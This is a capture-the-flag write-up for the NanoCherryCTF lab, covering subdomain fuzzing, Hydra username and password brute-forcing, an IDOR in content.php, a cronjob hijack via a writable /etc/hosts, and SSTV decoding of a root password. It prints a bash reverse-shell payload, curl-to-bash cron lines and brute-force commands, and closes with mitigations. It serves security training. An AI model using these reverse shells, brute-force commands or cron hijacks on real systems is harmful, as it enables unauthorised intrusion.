# NanoCherryCTF

**Difficulty:** Medium
**Category:** Web Exploitation / Linux / Privilege Escalation

## Summary

NanoCherryCTF is a Linux-based CTF involving web enumeration, subdomain discovery, username and password brute-forcing, credential reuse, cronjob abuse, IDOR, lateral movement and SSTV decoding.

We started with the credentials provided by the room and used them to gain initial access. From there, we discovered the application users and followed the attack chain through `molly-milk`, `bob-boba`, `sam-sprinkles` and finally `chad-cherry`. The final privilege escalation involved decoding an SSTV image hidden inside `rootPassword.wav` to recover the root password.

## Attack Chain

```text
Initial Credentials
        ↓
notsus
        ↓
Initial Web Access
        ↓
User Enumeration
        ↓
molly-milk
        ↓
chads-key1
        ↓
Cronjob + Writable /etc/hosts
        ↓
bob-boba
        ↓
chads-key3
        ↓
content.php IDOR
        ↓
sam-sprinkles
        ↓
chads-key2
        ↓
Combine all 3 key parts
        ↓
chad-cherry
        ↓
rootPassword.wav
        ↓
SSTV Decoding
        ↓
Root Password
        ↓
root flag
```

## Enumeration

First, we added the target IP and hostname to `/etc/hosts`:

```bash
echo "10.48.139.153 cherryontop.thm" >> /etc/hosts
```

The room provided initial credentials:

```text
Username: notsus
Password: dontbeascriptkiddie
```

We first used these credentials to access the target application. This initial access was important because it allowed us to continue enumerating the application and discover the relevant users.

A basic Nmap scan showed two open ports:

```text
22/tcp  open  ssh
80/tcp  open  http
```

We then performed directory enumeration using Gobuster, but nothing particularly useful was discovered.

### Subdomain Enumeration

We used `ffuf` for virtual-host/subdomain enumeration:

```bash
ffuf -u http://cherryontop.thm/ \
-H "Host: FUZZ.cherryontop.thm" \
-w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt \
-fs 0
```

This discovered:

```text
nano.cherryontop.thm
```

We added the subdomain to `/etc/hosts` as well.

## Web Enumeration – nano.cherryontop.thm

The discovered subdomain contained a login page:

```text
http://nano.cherryontop.thm/login.php
```

When an invalid username was submitted, the application responded with:

```text
This user doesn't exist
```

This indicated that the application was vulnerable to username enumeration.

We used Hydra to enumerate valid usernames:

```bash
hydra -L /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt \
-p test nano.cherryontop.thm http-post-form \
"/login.php:username=^USER^&password=^PASS^&submit=:F=This user doesn't exist"
```

A valid username was discovered:

```text
puppet
```

When an incorrect password was supplied for this user, the response changed to:

```text
Bad password
```

This confirmed that `puppet` was a valid account.

We then brute-forced the password:

```bash
hydra -l puppet \
-P /usr/share/wordlists/rockyou.txt \
nano.cherryontop.thm http-post-form \
"/login.php:username=^USER^&password=^PASS^&submit=:Bad password"
```

The password was:

```text
******
```

We logged into the application using the discovered credentials.

## Initial Access

After logging into the dashboard, we obtained information related to **Molly**, including her credentials and the user flag.

This gave us the credentials required to access the `molly-milk` account over SSH.

```bash
ssh molly-milk@cherryontop.thm
```

After accessing the account, we found `chads-key1.txt`, which contained the first part of Chad Cherry's password.

## Lateral Movement – notsus → bob-boba

We checked the system's cron configuration:

```bash
cat /etc/crontab
```

An interesting cronjob was found:

```text
* * * * * bob-boba curl cherryontop.tld:8000/home/bob-boba/coinflip.sh | bash
```

The important part was that `bob-boba` was periodically downloading a script from `cherryontop.tld` and executing its contents with `bash`.

We also discovered that we could modify `/etc/hosts`.

Therefore, we changed the `cherryontop.tld` entry so that it pointed to our AttackBox IP.

On the AttackBox, we created the directory structure expected by the cronjob:

```bash
mkdir -p ~/home/bob-boba
```

We then created our malicious `coinflip.sh`:

```bash
echo 'bash -i >& /dev/tcp/10.48.100.194/4444 0>&1' \
> ~/home/bob-boba/coinflip.sh
```

We started a Python HTTP server:

```bash
python3 -m http.server 8000
```

And started a listener:

```bash
nc -lvnp 4444
```

We triggered the request using

```text
cherryontop.tld:8000/home/bob-boba/coinflip.sh
```

and piped it directly into `bash`.

This gave us a reverse shell as:

```text
bob-boba
```

## bob-boba Enumeration

Inside the `bob-boba` account, we found:

```bash
cat chads-key3.txt
```

This contained the **third part of Chad Cherry's password**.

During enumeration, the relevant users on the system were:

```text
bob-boba
chad-cherry
molly-milk
sam-sprinkles
```

We already had access to `bob-boba` and had previously obtained the credentials for `molly-milk`.

The next target was `sam-sprinkles`.

## Web Enumeration – content.php

We returned to the web application and inspected:

```text
http://cherryontop.thm/content.php
```

While observing the request in the browser's Network tab, we found:

```text
http://cherryontop.thm/content.php?facts=2&user=I52WK43U
```

The `user` parameter contained the Base32-encoded username.

For example:

```text
guest → I52WK43U
```

We encoded:

```text
sam-sprinkles
```

which resulted in:

```text
ONQW2LLTOBZGS3TLNRSXG===
```

The `facts` parameter also appeared interesting, so we enumerated possible values from 1 to 100:

```bash
seq 100 > ids.txt
```

Then:

```bash
ffuf -u "http://cherryontop.thm/content.php?facts=FUZZ&user=ONQW2LLTOBZGS3TLNRSXG===" \
-w ids.txt \
-mc all \
-fr "Error"
```

Several valid entries were discovered, and **fact 43** contained useful information.

We intercepted the request through the browser's Network tab and selected **Edit and Resend**.

We modified the request to:

```text
http://cherryontop.thm/content.php?facts=43&user=ONQW2LLTOBZGS3TLNRSXG===
```

The response exposed credentials for:

```text
sam-sprinkles
```

We then used those credentials to SSH into the account:

```bash
ssh sam-sprinkles@cherryontop.thm
```

## sam-sprinkles → chad-cherry

Inside the `sam-sprinkles` account, we found:

```bash
cat chads-key2.txt
```

This gave us the **second part of Chad Cherry's password**.

At this point we had all three password fragments:

```text
chads-key1.txt → Part 1
chads-key2.txt → Part 2
chads-key3.txt → Part 3
```

Combining the three parts gave us the password for:

```text
chad-cherry
```

We then logged in:

```bash
ssh chad-cherry@cherryontop.thm
```

## User Flag

Inside the `chad-cherry` account, we found:

```text
chad-flag.txt
```

Reading the file gave us the **user flag**.

Another interesting file was:

```text
rootPassword.wav
```

This appeared to be related to the final privilege escalation.

## Privilege Escalation – SSTV

We downloaded `rootPassword.wav` to the AttackBox and researched the file format.

The audio contained an **SSTV transmission**, which could be converted into an image using the `sstv` tool.

We used the SSTV project:

[SSTV GitHub Repository](https://github.com/colaclanth/sstv)

After setting up the tool, we decoded the WAV file:

```bash
sstv -d rootPassword.wav -o root.png
```

This produced:

```text
root.png
```

We opened the image:

```bash
xdg-open root.png
```

The decoded image contained the **root password**.

We then switched to the root account:

```bash
su root
```

After entering the recovered password:

```bash
  cat root-flag.txt
```

This gave us the **root flag**, completing NanoCherryCTF.

## Mitigation

1. **Prevent username enumeration** by returning the same generic login error for invalid usernames and passwords.
2. **Secure cronjobs** — never download and pipe remote content directly into `bash`.
3. **Restrict ****`/etc/hosts`**** permissions** so unprivileged users cannot manipulate hostname resolution.
4. **Fix IDOR vulnerabilities** by performing proper server-side authorization checks for every requested resource.
